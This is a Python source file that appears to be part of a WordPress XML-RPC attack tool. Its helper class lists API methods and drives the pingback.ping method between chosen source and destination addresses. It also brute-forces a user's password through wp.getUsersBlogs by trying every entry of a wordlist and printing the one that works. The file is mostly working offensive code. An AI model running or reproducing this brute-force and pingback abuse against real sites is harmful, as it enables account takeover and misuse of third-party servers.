from argparse import Namespace
from typing import List, AnyStr
from logging import error, info, warning

from XmlRpcRequest import XmlRpcRequest


class XmlRpcHelper(object):

    def __init__(self, args: Namespace):
        self.args = args

        self.url = args.u
        self.method = args.m

        self.xmlRpcRequest = XmlRpcRequest(url=self.url, method=self.method)

    def _launchGetApiMethods(self) -> AnyStr:
        return self.xmlRpcRequest.sendRequest()

    def _launchPingMode(self, src: str, dst: str) -> AnyStr:
        return self.xmlRpcRequest.sendRequest(first_param=src, second_param=dst)

    @staticmethod
    def _readWordlist(file_path: str) -> List[str]:
        try:
            return [passwd.rstrip('\n') for passwd in open(file_path, 'r').readlines()]
        except FileNotFoundError or FileExistsError as e:
            error(msg=f"[!]\tError while opening/reading specified file: {e.strerror}")
            exit(-1)

    def _launchBruteMode(self, login: str, file_path: str) -> AnyStr:
        passwords = XmlRpcHelper._readWordlist(file_path=file_path)

        for passwd in passwords:
            response = self.xmlRpcRequest.sendRequest(first_param=login, second_param=passwd)
            validation_response = self.xmlRpcRequest.isInvalidCreds(response)

            if validation_response is True:
                return passwd

            warning(msg=f"'[-] Nope! Not this password: {passwd}")

        exit(-1)

    def selectScriptMode(self) -> None:

        if self.method == 'pingback.ping':
            src = self.args.s
            dst = self.args.d

            response_text = self._launchPingMode(src=src, dst=dst)
            info(msg=response_text)

        elif self.method == 'wp.getUsersBlogs':
            login = self.args.l
            passwords_file_path = self.args.p

            founded_passwd = self._launchBruteMode(login=login, file_path=passwords_file_path)
            info(msg=f"[+] Done! The password has been founded: {founded_passwd}")

        else:
            response = self._launchGetApiMethods()
            info(msg=response)
